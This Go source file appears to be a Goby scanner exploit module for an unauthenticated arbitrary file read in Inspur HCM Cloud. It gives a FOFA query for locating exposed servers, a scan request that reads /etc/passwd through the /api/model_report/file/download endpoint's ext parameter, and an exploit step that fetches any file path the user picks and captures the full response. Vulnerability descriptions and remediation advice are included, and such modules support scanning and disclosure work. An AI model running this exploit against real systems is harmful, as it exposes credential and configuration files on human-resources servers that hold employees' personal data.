package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Inspur HCM Cloud /api/model_report/file/download File Read Vulnerability",
    "Description": "<p>Inspur HCM Cloud 5.0 is a human resource management system built with next-generation cloud computing microservice architecture. The /api/model_report/file/download endpoint has an arbitrary file read vulnerability, allowing attackers to read sensitive files (e.g., database configuration files, system configuration files) without authentication, potentially leading to sensitive information disclosure and further threatening system security.</p>",
    "Product": "Inspur HCM Cloud",
    "Homepage": "https://www.inspur.com/lcjtww/2315499/2318933/2316107/index.html",
    "DisclosureDate": "2024-11-08",
    "PostTime": "2025-01-09",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"HCM,Cloud,HR,人力资源,云,云服务\" && body=\"/static/resources/images/hcmcloud.ico\"",
    "GobyQuery": "body=\"HCM,Cloud,HR,人力资源,云,云服务\" && body=\"/static/resources/images/hcmcloud.ico\"",
    "Level": "0",
    "Impact": "<p>The /api/model_report/file/download endpoint in Inspur HCM Cloud has an arbitrary file read vulnerability, allowing attackers to read sensitive files (e.g., database configuration files, system configuration files) without authentication, potentially leading to sensitive information disclosure and further threatening system security.</p>",
    "Recommendation": "<p>1. Disable related services exposed to the Internet or set access permissions for the interface.2. Upgrade the system to the secure version provided by the vendor.</p>",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488948&idx=1&sn=de4ba6feb98cfc9e86ec3282a84ef9e1&chksm=c267a087f5102991508af2ef28a8a2a020477a9a425490e79b77133cb237636c73f8e7c0eff5&token=385896921&lang=zh_CN#rd"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/model_report/file/download?index=/&ext=/etc/passwd",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/model_report/file/download?index=/&ext={{{filePath_encode}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "浪潮海岳 HCM Cloud /api/model_report/file/download 文件读取漏洞",
            "Product": "浪潮海岳 ",
            "Description": "<p>浪潮海岳 HCM Cloud 5.0 是一款采用新一代云计算微服务技术架构的人力资源管理系统。该系统的 /api/model_report/file/download 接口存在任意文件读取漏洞，攻击者无需身份验证即可通过该漏洞读取系统中的敏感文件（如数据库配置文件、系统配置文件等），可能导致敏感信息泄露，进一步威胁系统安全。</p>",
            "Recommendation": "<p>1. 关闭暴露在互联网的相关服务接口或设置接口访问权限。2. 升级系统至厂商提供的安全版本。</p>",
            "Impact": "<p>浪潮海岳 HCM Cloud /api/model_report/file/download 接口存在任意文件读取漏洞，攻击者无需身份验证即可通过该漏洞读取系统中的敏感文件（如数据库配置文件、系统配置文件等），可能导致敏感信息泄露，进一步威胁系统安全。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Inspur HCM Cloud /api/model_report/file/download File Read Vulnerability",
            "Product": "Inspur HCM Cloud",
            "Description": "<p>Inspur HCM Cloud 5.0 is a human resource management system built with next-generation cloud computing microservice architecture. The /api/model_report/file/download endpoint has an arbitrary file read vulnerability, allowing attackers to read sensitive files (e.g., database configuration files, system configuration files) without authentication, potentially leading to sensitive information disclosure and further threatening system security.</p>",
            "Recommendation": "<p>1. Disable related services exposed to the Internet or set access permissions for the interface.2. Upgrade the system to the secure version provided by the vendor.</p>",
            "Impact": "<p>The /api/model_report/file/download endpoint in Inspur HCM Cloud has an arbitrary file read vulnerability, allowing attackers to read sensitive files (e.g., database configuration files, system configuration files) without authentication, potentially leading to sensitive information disclosure and further threatening system security.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "filePath_encode": "define|query_encode|{{{filePath}}}"
    },
    "VariablesOrder": [
        "filePath",
        "filePath_encode"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}